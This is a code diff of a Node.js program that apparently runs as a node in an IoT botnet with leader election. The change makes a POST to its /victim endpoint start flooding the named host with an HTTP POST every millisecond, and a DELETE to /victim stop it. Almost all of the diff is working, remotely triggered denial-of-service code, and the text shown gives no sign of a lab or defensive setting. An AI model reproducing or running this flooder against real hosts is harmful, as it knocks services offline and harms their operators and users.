@@ -12,7 +12,7 @@ var id = process.argv.slice(2);//"My IoT";
 var leader = true;
 var receivedAll = 0;
 var electionSent = 0;
-var attack = false;
+var attackingInterval;
 
 function randomizer(min, max) {
 	return Math.floor(Math.random() * (max - min + 1)) + min;
@@ -140,13 +140,6 @@ function sendElectionToAll() {
 	}
 }
 
-/*app.post("/attackers", function(req, res) {
-	console.log("receiving attackers data...");
-	attackersData = req.body;
-	//console.log(attackersData);
-	res.sendStatus(200);
-});*/
-
 app.put("/election", function(req, res) {
 	console.log("receiving election...");
 	res.send("OK");
@@ -161,26 +154,22 @@ app.post("/election", function(req, res) {
 app.post("/victim", function(req, res) {
 	console.log("attacking...");
 	console.log(req.body.victim);
-	attack = true;
-	while (attack) {
-		attackVictim(req.body.victim);
-	}
+	attackingInterval = setInterval(function () {attackVictim(req.body.victim)}, 1);
 	res.sendStatus(200);
 });
 
 app.delete("/victim", function(req, res) {
-	attack = false;
+	console.log("stopping attack...")
+	clearInterval(attackingInterval);
 	res.sendStatus(200);
 });
 
 function attackVictim(victim) {
-	console.log("http://" + victim + "/attacker");
 	request.post({
 	  headers: {"content-type" : "application/json"},
 	  url:     "http://" + victim + "/",
 	  body:    JSON.stringify({"x":"D"})
 	}, function(error, res, body){
-		console.log(error);
 	});
 }
 
